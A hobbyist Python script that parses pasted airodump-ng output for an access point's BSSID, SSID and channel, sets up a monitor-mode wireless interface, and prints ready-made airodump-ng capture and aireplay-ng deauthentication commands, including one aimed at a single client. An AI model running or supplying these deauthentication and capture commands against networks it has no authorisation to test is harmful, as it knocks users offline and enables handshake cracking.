#!/usr/bin/python3
import re
import os.path
import os
derp = input("DUMP your input to start: ")
wifi_interface = ''
ch = 0
L = [derp]
X = '([a-fA-F0-9]{2}[:|\-]?){6}' # this is the regex macs or bssids
bssid = 0
end_ssid = '(\w+)$'
ssid = 0
monitor = False
thewifiInterface = "Unknown"
moitor = ''
iwconfig = ''


#######################################################################
#mon[0-9]{1}        this may regex mon0 or mon1 so on up to 9
#wlan[0-9]{1}       this may regex wlan0 or wlan1 so on up to 9
#wlan[0-9]{1}mon    this may regex wlan0mon or wlan1mon so on up to 9
#[\-]{1}[0-9]{2}    this may regex the signl
#######################################################################
#ifconfig | grep -E -o 'wlan[0-9]{1}'



def main():
    os.system("clear")
    global  wifi_interface
    # Open a file
    fo = open("inter_face.txt", "r+")
    wifi_interface = fo.read()
    # Close opened file
    fo.close()
    strip_bssid()
    strip_ssid()
    get_ch()
    finelpirnt()



def check():
    global wifi_interface
    if os.path.exists("inter_face.txt")==True:
        # Open a file
        fo = open("inter_face.txt", "r+")
        wifi_interface = fo.read()
        # Close opened file
        fo.close()


        main()
    else:
        print("Trying to Auto Detect Mon Interface")
        iwconfig_file()


def setupconfig():
        print("""
HELLO welcome to first time config.
lets get your wifi interface and save it.
You can delete or mod the inter_face.txt file to reset 
or just set it to what you want...
Anyway
====================
1. wlan0mon
2. wlan1mon
3. mon0
4. mon1
5. wlan0
6. wlan1
U. user defined
====================
Input the Monitor Interface
""")
        do_this = input("choose :")
        if do_this == "1":
            print("setting to wlan0mon")
            wifi_interface = "wlan0mon"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this == "2":
            print("setting to wlan1mon")
            wifi_interface = "wlan1mon"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()


        elif do_this == "3":
            print("setting to mon0")
            wifi_interface = "mon0"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()


        elif do_this == "4":
            print("setting to mon1")
            wifi_interface = "mon1"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this == "5":
            print("setting to wlan0")
            wifi_interface = "wlan0"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this == "6":
            print("setting to wlan1")
            wifi_interface = "wlan1"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this in ('U','u'):
            wifi_interface = input("input the mon interface: ")
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        else:
            print("How could you fuck this up?")
            print("Im done with you.")




def strip_bssid():
    global X
    global L
    global bssid

    for s in L:

        a = re.compile(X).search(s)
        if a:

            bssid = (s[a.start(): a.end()])

def strip_ssid(): ### fix this for replay mac not ssid cuz ssid may have spaces but this is still useful
    global L
    global ssid
    ssid = (derp.split()[-1])


def get_ch():
    global ch
    global derp
    ch_is = (derp.split()[5])
    ch = ch_is


####################################################################################


def iwconfig_file():
    global iwconfig
    global moitor
    monitor = False
    iwconfig = ''
    os.system("iwconfig > iwconfig.txt ")
    os.system("clear")
    fo = open("iwconfig.txt", "r+")
    iwconfig = fo.read()
    fo.close()
    # go to next func
    test_for_muti_intherface()


def test_for_muti_intherface():
    global iwconfig
    global moitor
    muli_mon_test = re.findall(r'(wlan\d{1}mon)|(mon\d{1})|(wlan\d{1})', iwconfig)
    print(muli_mon_test.__len__(), "Interface/s Found")
    num_of_interface = muli_mon_test.__len__()  # debug

    if num_of_interface == 1:
        print("number of interface/s only 1")
        # go to mon_checker
        mon_checker()

    elif num_of_interface > 1:
        print("number of interfaces is more than 1")
        mon_checker()
        #setupconfig()

    elif num_of_interface == 0:
        print("Oh shit you have no Wireless interface... that sux")
        setupconfig()

    else:
        print("fail 1")


def mon_checker():
    global monitor
    global iwconfig

    if re.search(r"Mode:Monitor", iwconfig):
        monitor = True
        print('Monitor Mode Auto Detected!!!')
        interface_sifter()
    else:
        monitor = False
        print("Monitor Mode >>NOT<< Auto Detected")
        # ask if user wants to go to config or continue to ##interface_sifter()##
        interface_sifter()


def interface_sifter():
    global iwconfig
    global wifi_interface
    global monitor
    if re.search(r'(wlan\d{1}mon)|(mon\d{1})|(wlan\d{1})', iwconfig):
        print("A Wireless Interface Has Been Detected...")
        wifi_interface = re.search(r'(wlan\d{1}mon)|(mon\d{1})|(wlan\d{1})', iwconfig).group()
        print("It looks like:", wifi_interface)

        if re.search(r'(wlan\d{1}mon)|(mon\d{1})', wifi_interface):
            print(wifi_interface, "Looks Good as a Monitor Interface")
            save_interface_or = input("""
Do you you want to... 
1.Save this Interface
or
2.Go to Config and set you own
Input 1 or 2 :""")
            if save_interface_or == '1':

                # Open a file
                fo = open("inter_face.txt", "w+")
                fo.write(wifi_interface)
                # Close opend file
                fo.close()
                print("Saved")
                # next func
                main()

            elif save_interface_or == '2':
                print("Going to config...")
                # go to config
                setupconfig()
            else:
                os.system("clear")
                print("Error you have Launched a NUKE!!!")
                print("Try Again...")
                interface_sifter()


        elif re.search(r'wlan\d{1}', wifi_interface):
            print(wifi_interface, "Look like an Wireless Interface BUT may or may not be in Monitor mode")
            if monitor == True:
                print('OK! So I Detect a Monitor Mode... So')
                save_interface_or = input("""
Do you you want to... 
1.Save this Interface
or
2.Go to Config and set you own
Input 1 or 2 :""")
                if save_interface_or == '1':

                    # Open a file
                    fo = open("inter_face.txt", "w+")
                    fo.write(wifi_interface)
                    # Close opend file
                    fo.close()
                    print("Saved!    To Reset delete inter_face.txt")
                    # next func
                    main()

                elif save_interface_or == '2':
                    print("Going to config...")
                    # go to config
                    setupconfig()
                else:
                    os.system("clear")
                    print("Error you have Launched a NUKE!!!")
                    print("Try Again...")
                    interface_sifter()
                # Open a file
                fo = open("inter_face.txt", "w+")
                fo.write(wifi_interface)
                # Close opend file
                fo.close()

                # next func
                main()

            else:
                print(wifi_interface, """ Is not in Monitor Mode... 
!!!Coming Soon!!! Put it in Monitor Mode for me ... if ran as root ... you fool""")
                print("Going to Config...")
                # go to config
                setupconfig()

        else:
            print("fail")

    else:
        print("fail")


###############################################################################################



def finelpirnt():
    global bssid,ssid,wifi_interface
    os.system("clear")
    print("""
==========
INFO
==========
""")
    print("WiFi Interface is set to :", wifi_interface)
    print("MAC/BSSID of AP is:",bssid)
    print("SSID of AP is:",ssid)
    print("Commands Generated...")
    print("""
==========
Listening
==========""")

    print("sudo airodump-ng -w",ssid,"--channel",ch,"--bssid",bssid,wifi_interface)
    print("""
========================
Replay Stuff For DeAuth
========================""")
    print("sudo aireplay-ng -0 5 -e",ssid,wifi_interface,"  <===Normal")
    print("sudo aireplay-ng -0 5 -a",bssid,wifi_interface,"  <===If SSID has a Space in it")
    print("sudo aireplay-ng -0 5 -a",bssid,"-c <input target mac here>",wifi_interface,"  <===Hard-Mode")

check()
